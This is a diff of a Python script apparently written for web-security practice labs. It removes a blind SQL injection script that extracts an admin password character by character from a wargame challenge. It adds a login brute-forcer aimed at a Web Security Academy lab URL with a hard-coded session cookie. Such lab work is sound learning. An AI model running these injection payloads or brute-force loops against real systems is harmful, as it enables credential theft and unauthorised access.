@@ -1,31 +1,24 @@
 import requests
+from Post_Method import *
+url = "https://0a5200210369d72bd598f9d100f80049.web-security-academy.net/login"
+headers = {"Cookie" : "session=OAu19Dg9CVaQe8S546IFmZUsLypdmveI"}
+       
+c = int(input("How many data : "))
+d = []
+for i in range(0,c):
+    d.append(input("Data %d : " %(i)))
+bf_data = int(input("Choose data to bf : "))
+data = {}
+for i in range(0,len(d)):
+    if i != bf_data:
+        add = {
+            d[i] : input("%s : " %(d[i]))
+        }
+        data.update(add)
+    else:
+        add = {
+            d[i] : "test"
+        }
+        data.update(add)
 
-url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
-headers = {"Cookie" : "PHPSESSID=1mg3tdj3njma0epf82af1kr1d2"}
-
-def get_pw(index):
-    
-    for i in range(33,126):
-        
-        value = "' or id='admin' and (select 1 union select (ord(substr(pw,{},1))={}))#".format(str(index),str(i))
-
-        r = requests.get(url, params={'pw' : value}, headers = headers)
-
-        if "select id from prob_dark_eyes where" in r.text:
-            print(chr(i),end="")
-            return True
-
-    return False
-
-############### Get PASSWORD ################
-
-ret = True
-index = 0
-
-print("PASSWORD - ",end="")
-
-while ret:
-    index += 1
-    ret = get_pw(index)
-
-###########################################
+Post_Easy_Bf(url , headers, data, d , bf_data)
